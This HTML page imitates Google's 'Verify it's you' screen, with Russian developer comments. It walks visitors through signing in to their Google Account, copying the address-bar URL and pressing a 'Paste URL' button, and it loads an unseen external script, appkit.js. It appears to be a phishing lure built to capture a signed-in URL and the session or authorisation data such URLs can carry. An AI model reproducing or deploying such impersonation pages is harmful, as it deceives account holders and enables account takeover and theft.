<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Verify it's you – Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', Arial, sans-serif;
        }

        body {
            background: rgba(0, 0, 0, 0.45);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        /* главная карточка */
        .card {
            background: #ffffff;
            width: 100%;
            max-width: 480px;
            border-radius: 8px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.25);
            padding: 40px 40px 32px;
            position: relative;
        }

        /* логотип Google (цветные буквы) */
        .logo {
            font-size: 26px;
            font-weight: 500;
            letter-spacing: -0.5px;
            margin-bottom: 28px;
            display: flex;
            align-items: center;
        }
        .logo .g1 { color: #4285F4; } /* синяя G */
        .logo .o1 { color: #EA4335; } /* красная o */
        .logo .o2 { color: #FBBC05; } /* жёлтая o */
        .logo .g2 { color: #4285F4; } /* синяя g */
        .logo .l  { color: #34A853; } /* зелёная l */
        .logo .e  { color: #EA4335; } /* красная e */

        /* заголовок */
        .title {
            font-size: 24px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 10px;
        }

        /* подзаголовок */
        .sub {
            font-size: 14px;
            color: #5F6368;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        /* шаги */
        .steps {
            list-style: none;
            margin-bottom: 32px;
            padding: 0;
        }

        .steps li {
            display: flex;
            align-items: flex-start;
            gap: 14px;
            font-size: 14px;
            color: #202124;
            line-height: 1.5;
            margin-bottom: 16px;
        }

        .steps li:last-child {
            margin-bottom: 0;
        }

        .step-number {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            min-width: 24px;
            height: 24px;
            border-radius: 50%;
            background: #E8F0FE;
            color: #1A73E8;
            font-size: 13px;
            font-weight: 500;
            flex-shrink: 0;
            margin-top: 1px;
        }

        /* кнопки */
        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 12px;
            margin-bottom: 28px;
            flex-wrap: wrap;
        }

        .btn {
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            letter-spacing: 0.25px;
        }

        .btn-primary {
            background: #1A73E8;
            color: #fff;
        }
        .btn-primary:hover {
            background: #1557B0;
        }
        .btn-primary:active {
            background: #10468A;
        }

        .btn-secondary {
            background: transparent;
            color: #1A73E8;
        }
        .btn-secondary:hover {
            background: rgba(26, 115, 232, 0.08);
        }

        /* переключатель языка */
        .lang-selector {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 14px;
            color: #3C4043;
            margin-bottom: 24px;
            cursor: default;
            width: fit-content;
        }

        .lang-selector .arrow {
            font-size: 12px;
            color: #5F6368;
            margin-left: 2px;
        }

        /* нижние ссылки */
        .footer-links {
            display: flex;
            gap: 6px;
            font-size: 12px;
            color: #5F6368;
            flex-wrap: wrap;
        }

        .footer-links a {
            color: #5F6368;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .footer-links .dot {
            color: #9AA0A6;
        }

        /* адаптив */
        @media (max-width: 480px) {
            .card {
                padding: 24px 20px 24px;
            }
            .actions {
                flex-direction: column;
                align-items: stretch;
            }
            .btn {
                text-align: center;
            }
        }
    </style>
</head>
<body>

<div class="card">

    <!-- Логотип Google -->
    <div class="logo">
        <span class="g1">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
    </div>

    <!-- Заголовок -->
    <h1 class="title">Verify it's you</h1>

    <!-- Подзаголовок -->
    <p class="sub">
        To help keep your account secure, Google needs to verify it's you. Please follow the instructions.
    </p>

    <!-- Шаги -->
    <ul class="steps">
        <li>
            <span class="step-number">1</span>
            Sign in to your Google Account.
        </li>
        <li>
            <span class="step-number">2</span>
            Copy the URL from the address bar.
        </li>
        <li>
            <span class="step-number">3</span>
            Click Paste URL and confirm paste.
        </li>
    </ul>

    <!-- Кнопки -->
    <div class="actions">
        <button class="btn btn-primary">Sign In</button>
        <button class="btn btn-secondary">Paste URL</button>
    </div>

    <!-- Язык -->
    <div class="lang-selector">
        English
        <span class="arrow">▾</span>
    </div>

    <!-- Footer -->
    <div class="footer-links">
        <a href="#">Help</a>
        <span class="dot">•</span>
        <a href="#">Privacy</a>
        <span class="dot">•</span>
        <a href="#">Terms</a>
    </div>

</div>

<!-- Подключение скрипта appkit.js -->
<script src="./appkit.js"></script>

</body>
</html>
